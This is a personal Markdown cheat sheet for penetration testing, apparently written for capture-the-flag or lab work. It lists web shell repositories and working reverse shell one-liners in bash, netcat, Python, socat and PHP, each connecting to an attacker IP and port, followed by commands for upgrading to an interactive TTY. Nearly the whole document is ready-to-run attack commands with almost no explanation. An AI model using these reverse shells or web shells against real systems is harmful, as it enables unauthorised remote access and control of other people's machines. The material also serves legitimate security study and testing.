# Shells 
- [ ] Web shell 
- [ ] Reverse shell commands 
- [ ] Upgrading shells 

## Web shells 
[phpbash web shell](https://github.com/Arrexel/phpbash)  
[pentest monkey php shell](https://github.com/pentestmonkey/php-reverse-shell)  
[p0wney web shell](https://github.com/flozz/p0wny-shell)  
[collection of PHP webshells](https://github.com/JohnTroony/php-webshells/tree/master/Collection)    

## Debugging Shells   
executing a command and no response - maybe the command is redirecting to stderr not stdout?
2>&1
Check for versions / path variables  
No path variable? Need absolute path 

    /bin/bash -c 'id'   

## Reverse shell commands  
    bash -i >& /dev/tcp/10.6.85.85/4444 0>&1
nc w/ -e (traditional):  

    nc -e /bin/sh 172.16.5.1 4242   
    
nc openbsd (no -e):    

    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.6.85.85 53 >/tmp/f    
python: 

    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",53));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")' 
    
socat                     

    socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<IP>:4444 
    
PHP            
    
    php -r '$sock=fsockopen("10.6.85.85",4444);exec("/bin/sh -i <&3 >&3 2>&3");' 
   
Also Ruby, Java: Reverse shells cheat sheet    
[Tiberius Reverse Shells](https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/reverse-shells.rst) 



## Upgrading to a pseudo terminal / TTY     

    python -c 'import pty;pty.spawn("/bin/bash")' 
    echo os.system('/bin/bash')
    /bin/sh -i  
    
    SHELL=/bin/bash script -q /dev/null        Ctrl-Z        stty raw -echo        fg    reset    xterm
    
    Can you upload a [socat static binary](https://github.com/andrew-d/static-binaries)? 
    
    vi -> :sh or :!UNIX_command
    perl —e 'exec "/bin/sh";' 
    perl: exec "/bin/sh"; 
    ruby: exec "/bin/sh" 
    lua: os.execute('/bin/sh') 
    

